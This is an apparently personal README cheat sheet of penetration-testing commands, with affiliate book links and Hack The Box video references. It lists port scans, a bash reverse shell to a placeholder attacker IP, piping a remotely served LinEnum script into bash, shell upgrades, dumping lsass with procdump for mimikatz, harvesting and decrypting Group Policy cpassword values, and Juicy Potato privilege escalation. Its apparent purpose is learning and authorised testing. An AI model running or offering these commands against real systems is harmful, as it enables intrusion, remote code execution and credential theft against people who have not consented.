# Usefull-hacking-tips
Some books you want to read:<br>
<ul>
<li><a href="https://www.amazon.com/gp/product/1980901759/ref=as_li_tl?ie=UTF8&camp=1789&creative=9325&creativeASIN=1980901759&linkCode=as2&tag=1333706-20&linkId=b7f2896fbcc265738ba6f2803339d6d2" target="_blank">The Hacker Playbook 3: Practical Guide To Penetration Testing</a></li>
<li><a href="https://amzn.to/2zvdQmI" target="_blank"> Advanced Penetration Testing: Hacking the World's Most Secure Networks</a></li>
  <li><a href="https://amzn.to/2P9TnbS" target="_blank">Social Engineering: The Science of Human Hacking</a></li>
</ul>

usefull tips and tools for hacking
<ul>
  <li> create a file with a range of ip addresses: seq -f "10.10.10.%g" 1 254 > ip.txt
  <li> or use prips 10.0.0.0/23 > ip.txt (first install prips: apt install prips)
  <li>echo  $HISTFILE to check the history file location
</ul>

<b>Port scan commands</b>
<ul>
  <li> nmap -T4 -sV -sT --reason -p1-65535 --vv -oN 'filename' 'IP'
  <li> nmap -sC -sV -oA filename ip - ippsec parameters
  <li> nmap --script vuln 'IP'
  <li> nmap -sV -sC -A -oN filename ip
  <li> unicornscan -r300 -mU 'IP' - UDP scan. USE -mT for TCP
</ul>

<b>IpSec</b>
<ul>
  <li> python -m SimpleHTTPServer PORT
  <li> curl IP:PORT/LinEnum.sh | bash
</ul>

<b>SMB scan</b>
<ul>
  <li> smbclient -N //ip/sharename
</ul>

<b>Priv Esc</b>
<ul>
  <li> sudo -l
  <li> https://github.com/ohpe/juicy-potato  
</ul>

    
<b>Shell</b>
<ul>
  <li> python -c 'import pty; pty.spawn("/bin/sh")'
  <li> python -c 'import pty; pty.spawn("/bin/bash")'
  <li> bash -c 'bash -i >& /dev/tcp/YOURIP/PORT 0>&1'
  <li> when having a shell type CTRL-Z to background the shell. then type stty raw -echo and then fg
</ul>

<b>WPscan</b>
<ul>
  <li> wpscan -u URL -eu -ep -et
</ul>


<b>IPSEC hackthebox</b>
<ul>
  <li> juicypotato windows priv esc - Conceal https://www.youtube.com/watch?v=1ae64CdwLHE
  <li> setuid viewuser - Irked https://www.youtube.com/watch?v=OGFTM_qvtVI
  <li> hackthebox squid server - https://www.youtube.com/watch?v=5wyvpJa9LdU
</ul>

<b>Bloodhound</b>
<ul>
  <li> wget -O - https://debian.neo4j.org/neotechnology.gpg.key | sudo apt-key add -
  <li> echo 'deb https://debian.neo4j.org/repo stable/' | sudo tee /etc/apt/sources.list.d/neo4j.list
  <li> sudo apt-get update
  <li> apt-get install neo4j
  <li> apt-get install bloodhound
  <li> neo4j start (set the admin password in the browser)
  <li> bloodhound
</ul>

<b>Screenshot</b>
<ul>
  <li>gowitness-2.1.2-windows-amd64.exe scan --cidr 192.168.230.0/24 --threads 10
  <li>gowitness-2.1.2-windows-amd64.exe scan -f ip_in_file.txt --threads 10
  <li>gowitness-2.1.2-windows-amd64.exe report serve
</ul>

<b>Procdump</b>
<ul>
  <li> procdump lsass https://www.onlinehashcrack.com/how-to-procdump-mimikatz-credentials.php
  <li>
</ul>

<b>cpassword</b>
<ul>
  <li> findstr -S cpassword $env:logonserver\sysvol\*.xml
  <li> crack passwords with https://github.com/t0thkr1s/gpp-decrypt
</ul>

<b>Find string with grep</b>
<ul>
  <li> grep -oP '(?<="InsertSearchString": ")[^"]*'
  
</ul>

<b>Run pingcastle fromt CMD </b>
<ul>
  <li> PingCastle.exe --server dc.local --user xxxx --password xxxx --healthcheck
  <li> PingCastle.exe --server x.x.x.x --export users --user domainuser --password domainpassword
  
</ul>
